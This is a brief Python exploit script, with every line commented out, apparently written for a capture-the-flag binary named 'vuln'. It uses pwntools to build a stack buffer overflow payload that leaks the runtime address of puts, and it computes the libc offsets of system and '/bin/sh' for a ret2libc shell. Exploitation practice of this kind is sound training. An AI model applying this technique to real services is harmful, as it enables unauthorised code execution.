# RazviOverflow
# Python 3

# from pwn import *
# 
# static_library = ELF("libc.so.6")
# static_binary = ELF("vuln")
# binary = process("vuln")
# 
# puts_plt_address = p32(static_binary.plt['puts'])
# puts_got_address = p32(static_binary.got['puts'])
# 
# system_address = static_library.symbols['system']
# puts_address = static_library.symbols['puts']
# 
# print(hex(system_address))
# print(hex(puts_address))
# 
# system_offset_from_puts = system_address - puts_address # -0x2c4a0
# 
# print(hex(system_offset_from_puts)) 
# 
# binsh_address = next(static_library.search(b"/bin/sh")) # 0x192352
# 
# print(hex(binsh_address))
# 
# print(binary.recv())
# binary.sendline("2") #bad thoughts writing @ ebp-0x28
# 
# payload_print_dynamically_loaded_puts = b"A"*0x28 + b"B"*0x4 + puts_plt_address + puts_got_address
# 
# binary.sendline(payload_print_dynamically_loaded_puts)
# print(binary.recv())

